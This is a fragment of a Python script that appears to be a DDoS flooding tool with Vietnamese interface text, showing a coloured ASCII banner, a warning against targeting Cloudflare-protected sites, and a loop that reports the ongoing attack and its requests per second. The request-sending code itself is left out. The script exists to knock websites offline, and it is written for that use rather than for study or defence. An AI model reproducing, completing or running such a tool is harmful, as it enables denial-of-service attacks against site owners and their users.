...
print ("""\x1b[38;2;255;20;148m╔══╗╔═╗╔═╗╔╗─
\x1b[38;2;255;20;148m╚╗╔╝║║║║║║║║─
\x1b[38;2;255;20;148m─║║─║║║║║║║╚╗
\x1b[38;2;255;20;148m─╚╝─╚═╝╚═╝╚═╝
...
\033[1;32mĐÂY LÀ TOOL SIÊU NHẸ, ĐỪNG ẢO TƯỞNG NHÉ, KHÔNG NÊN TẤN CÔNG WEB CÓ CLOUDFLARE!!!
""")
acceptall = [
...
def OutputToScreen(ind_rlock):
	...
	while 1:
		if i > 3:
			i = 0
		print("{:^70}".format("Đang trong trạng thái tấn công"))
		print("{:^70}".format("IP:PORT   <->   Yêu cầu DDOS của bạn đã được gửi   "))
		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
		ind_rlock.acquire()
		top_num = 0
		top1= sorted(ind_dict, key=ind_dict.get, reverse=True)
		if len(top1) > 1:
			top_num = 1
		else:
			top_num = len(top1)
		...
		for k,v in ind_dict.items():
			...
			ind_dict[k] = 0
		ind_rlock.release()
		print("{:^70}".format(" ["+sp_char[i]+"] Đang Tấn công DDoS :D | Tổng Rps: "+str(total)))
		i+=1
		time.sleep(60)
		print("\n"*1)
